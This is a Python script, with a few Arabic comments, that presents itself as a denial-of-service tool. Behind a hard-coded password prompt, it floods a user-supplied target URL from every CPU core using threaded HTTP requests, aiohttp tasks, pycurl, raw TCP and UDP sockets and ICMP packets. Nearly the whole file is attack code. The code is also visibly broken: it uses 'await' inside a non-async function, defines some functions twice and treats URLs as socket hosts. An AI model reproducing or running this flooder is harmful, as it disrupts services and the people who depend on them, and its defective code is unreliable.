import time
import multiprocessing
import requests
import aiohttp
import asyncio
import pycurl
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import socket
import os
import ssl
import sys
import signal

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = multiprocessing.Value('b', False)

def show_attack_animation():
    print("Loading...")

def start_attack():
    try:
        target = input("Target URL: ")
        print("Attack will continue indefinitely. Type 'stop' to end it.")
        execute_attack(target)
    except:
        pass

def execute_attack(target):
    total_cores = multiprocessing.cpu_count()

    print(f"Starting continuous attack on {target} using {total_cores} cores...")

    show_attack_animation()

    processes = []

    with stop_attack_flag.get_lock():
        stop_attack_flag.value = False

    try:
        for i in range(total_cores):
            process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
            processes.append(process)
            process.start()

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_requests_aiohttp(target, stop_attack_flag))

        pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_attack_flag))
        processes.append(pycurl_process)
        pycurl_process.start()

        socket_process = multiprocessing.Process(target=send_requests_socket, args=(target, stop_attack_flag))
        processes.append(socket_process)
        socket_process.start()

        udp_process = multiprocessing.Process(target=send_requests_udp, args=(target, stop_attack_flag))
        processes.append(udp_process)
        udp_process.start()

        icmp_process = multiprocessing.Process(target=send_requests_icmp, args=(target, stop_attack_flag))
        processes.append(icmp_process)
        icmp_process.start()

        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)

        for process in processes:
            process.join()

    except KeyboardInterrupt:
        with stop_attack_flag.get_lock():
            stop_attack_flag.value = True
        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)

    except:
        pass

def send_requests_threaded(target, stop_flag):
    session = requests.Session()

    def send_request():
        try:
            session.get(target, timeout=5, verify=False)
        except Exception as e:
            pass

    num_threads = 1500  # استخدام 1500 خيط كحد أقصى
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request) for _ in range(num_threads)]

        for future in futures:
            if stop_flag.value:
                break


def send_requests_aiohttp(target, stop_flag):
    async def send_request():
        async with aiohttp.ClientSession() as session:
            async with session.get(target, verify_ssl=False) as response:
                await response.read()

    tasks = [asyncio.create_task(send_request()) for _ in range(1500)]

    done, pending = await asyncio.wait(tasks)

    for task in pending:
        task.cancel()

def send_requests_pycurl(target, stop_flag):
    try:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, target)
        c.setopt(c.WRITEDATA, buffer)
        c.setopt(c.SSL_VERIFYPEER, 0)
        c.setopt(c.SSL_VERIFYHOST, 0)
        c.perform()
        c.close()
    except Exception as e:
        pass

def send_requests_socket(target, stop_flag):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, 443))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
        sock.close()
    except Exception as e:
        pass

def send_requests_udp(target, stop_flag):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (target, 443))
        sock.close()
    except Exception as e:
        pass

def send_requests_icmp(target, stop_flag):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target, 0))
        sock.close()
    except Exception as e:
        pass

def show_attack_animation():
    print("Loading...")

def start_attack():
    try:
        password = input("Enter password: ")
        if password == "your_password":
            target = input("Target URL: ")
            print("Attack will continue indefinitely. Type 'stop' to end it.")
            execute_attack(target)
        else:
            print("Incorrect password.")
    except:
        pass

def main():
    try:
        password_prompt()
    except:
        pass

def password_prompt():
    password = input("Enter password to access the attack interface: ")
    if password == "your_password":
        print("Access granted.")
        start_attack()
    else:
        print("Incorrect password.")
        sys.exit(0)

if __name__ == "__main__":
    main()
